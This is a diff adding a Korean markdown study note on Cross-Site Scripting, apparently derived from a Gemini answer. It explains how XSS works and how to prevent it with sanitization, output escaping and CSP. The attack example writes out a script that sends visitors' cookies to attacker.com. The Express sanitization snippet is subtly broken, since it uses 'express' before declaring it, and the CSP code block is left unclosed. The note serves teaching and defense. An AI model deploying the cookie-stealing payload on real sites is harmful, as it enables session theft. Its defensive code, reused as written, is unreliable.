@@ -1,0 +1,85 @@
+---
+created: 2025-03-30 21:07:44 +0900
+updated: 2025-03-31 21:07:06 +0900
+title: 'Cross-Site Scripting(XSS)'
+tags: ['Web']
+---
+
+## 개요
+
+-   **정의**: 공격자가 웹 사이트에 악성 스크립트를 삽입하여 다른 사용자가 해당 페이지를 볼 때 실행되도록 하는 공격
+-   **작동 방식**:
+	1.  공격자는 게시판, 댓글, URL 파라미터 등을 통해 악성 스크립트를 웹 서버에 삽입함
+	2.  피해자가 해당 페이지를 방문하면 악성 스크립트가 피해자의 브라우저에서 실행함
+	3.  스크립트는 쿠키, 세션 토큰 등 민감한 정보를 탈취하거나, 웹 페이지의 내용을 변조하거나, 사용자를 악성 사이트로 리디렉션할 수 있음
+	
+## 예방
+
+-   입력 값 검증 (Input Validation): 사용자 입력을 받을 때 HTML 태그, 특수 문자 등을 필터링하거나 이스케이프 처리함
+-   출력 값 인코딩 (Output Encoding): 웹 페이지에 데이터를 출력할 때 HTML 엔티티로 인코딩하여 스크립트가 실행되지 않도록 함
+-   Content Security Policy (CSP) 설정: 브라우저가 특정 출처에서만 스크립트를 실행하도록 제한함
+
+## 예시
+
+**시나리오:** 웹사이트의 게시판 기능에 XSS 취약점이 존재하는 경우
+
+1.  **공격:**
+
+    ```html title="공격자는 다음과 같은 악성 스크립트가 포함된 게시글 작성"
+    <script>
+      fetch('http://attacker.com/steal', {
+        method: 'POST',
+        body: document.cookie,
+        mode: 'no-cors' // CORS 우회
+      });
+    </script>
+    ```
+
+2.  **영향:**
+
+    -   다른 사용자가 해당 게시글을 포함한 페이지를 방문하면, 스크립트가 실행됨
+    -   스크립트는 방문자의 쿠키 정보를 공격자의 서버로 전송
+
+3.  **대비 방법:**
+
+    -   **입력 값 검증 (Sanitization):**
+	```javascript caption="게시글 입력 시 HTML 태그를 제거하거나, 특수 문자를 이스케이프 처리"
+	const app = express();
+	const express = require('express');
+	const sanitizeHtml = require('sanitize-html');
+
+	app.use(express.urlencoded({ extended: true }));
+
+	app.post('/post', (req, res) => {
+	  const dirty = req.body.content;
+	  const clean = sanitizeHtml(dirty, {
+	    allowedTags: sanitizeHtml.defaults.allowedTags.concat([ 'img' ]),
+	    allowedAttributes: {
+	      'img': [ 'src', 'alt' ]
+	    }
+	  });
+	  console.log(clean);
+	  res.send('Post received');
+	});
+	```
+
+    -   **출력 값 인코딩 (Escaping):**
+	```html caption="게시글을 화면에 표시할 때 HTML 엔티티로 인코딩"
+	<%- post.content %>  // XSS 취약
+	<%= post.content %>  // 안전 (HTML 이스케이프)
+	```
+
+    -   **CSP 설정:**
+	```javascript caption="HTTP 응답 헤더에 Content-Security-Policy를 설정하여 허용된 스크립트 출처를 명시"
+	app.use((req, res, next) => {
+	  res.setHeader(
+	    'Content-Security-Policy',
+	    "default-src 'self'; script-src 'self'"
+	  );
+	  next();
+	});
+
+## 참고
+
+- Google Gemini 답변
+
